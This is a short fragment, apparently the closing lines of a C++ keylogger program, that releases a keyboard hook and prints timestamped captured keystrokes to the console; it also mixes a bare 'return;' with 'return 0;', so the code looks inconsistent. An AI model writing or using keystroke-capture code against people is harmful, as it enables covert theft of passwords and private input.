            cout << "Keyboard logging stopped." << endl;
            releaseKeyboardHook();
            return;
        }

        // Print current timestamp and keystrokes
        cout << "[" << currentTimestamp << "] " << keystrokes.back() << endl;
        Sleep(100);  // Adjust delay as needed
    }

    return 0;
}
```

